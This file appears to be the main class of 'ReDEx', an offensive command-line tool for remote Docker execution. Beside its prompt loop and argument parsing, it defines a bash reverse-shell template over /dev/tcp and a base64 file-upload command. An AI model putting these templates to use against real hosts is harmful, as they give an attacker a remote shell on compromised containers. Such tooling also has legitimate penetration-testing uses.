from rich.console import Console
from rich.prompt import Prompt
from typing import List

from redex.utils.constants import *
from redex.utils.session import Session, ContainerDatas
from redex.data.container import DEFAULT_CONTAINER_DATA
from redex.utils.command import RedexCommands
from redex.data.exploit import ExploitHandler


class RemoteDockerExecution(object):
    """**Remote Docker Execution**

    """
    def __init__(self) -> None:
        self.console = Console(color_system="truecolor")
        self.welcome_msg()

        # Initialize a default container data dictionary using the default one
        self.container_data = ContainerDatas(DEFAULT_CONTAINER_DATA)

        # Initialized the Exploit handler
        self.exploit_hdl = ExploitHandler()

        # Initialize a number of variables used for the current session
        self.session = Session(s_exploits=self.exploit_hdl)
        self.session.s_names.append(self.session.s_name)

        self.exec_created = False
        self.command_types = {
            "revshell" : 'bash -i >& /dev/tcp/{:s}/{:d} 0>&1',
            "upload" : 'echo {:s} | base64 -d >> file{:s}'
        }

        self.printable_exploit = self.session.s_exploit.lower()

        # Take all the commands
        self.commands = RedexCommands()
    
    def welcome_msg(self) -> None:
        self.console.clear()
        self.console.print(APP_NAME, style="bold yellow")
        self.console.print(
            "[u]Welcome to Remote Docker Execution - ReDEx v1.0.0 by Haveel[/u]\n",
            style="purple"
        )
        self.console.print(INFO + "\n\n")
        if len(BUGS) > 0:
            self.console.print(
                "Bugs that needs to be fixed:\n" + "".join(BUGS) + "\n\n"
            )

    @staticmethod
    def merge_args(command_args: List[str]) -> List[str]:
        """ Reorganize the command arguments given along with the command  """
        outputs, old_string = [], ""

        for element in command_args:
            # If the element is an assignment command then, it checks if 
            # the string has been initialized or not. If it has been 
            # initialized with a previous element, then insert in the output
            # list the current content of the string, otherwise just
            # initialize the string with the contento of the current element.
            # If the command is not an assignment, then just place the element
            # in the string for a later use.
            if "=" in element:
                if old_string != "":
                    outputs.append(old_string.strip())

                old_string = element
                continue
        
            old_string += " " + element
        
        outputs.append(old_string.strip())
        return outputs

    def run(self) -> None:
        """ Actually runs the entire ReDEx tool """
        # Since the command line should appear until an error occurs
        # or until the user does not quit the application, we need
        # to start an infinite while loop.
        while True:
            try:

                if self.session.s_rhost != "0.0.0.0":
                    s_command = self.session.s_command
                    command = s_command if s_command in self.command_types  else "custom"
                    msg = f"([blue]{command}[/blue]:[yellow]{self.printable_exploit}[/yellow])"
                else:
                    msg = ""

                cmd = Prompt.ask(f">>> {msg}")

                # Take the name of the command. If the user has also given
                # a number of arguments then, we need to split the command
                # and runs the respective function
                splitted_cmd = cmd.split()
                command_name = splitted_cmd[0]
                if len(splitted_cmd) > 1:
                    command_args = self.merge_args(splitted_cmd[1:])
                    self.commands[command_name](self, *command_args)
                    continue

                self.commands[command_name](self)
            
            except KeyboardInterrupt: self.commands['quit'](self)
            except KeyError: self.console.print(
                f"Command '{cmd}' does not exists!!", style="bold yellow")
            except Exception as e:
                print(e)
                self.console.print(f"Command Failed!", style="bold red")
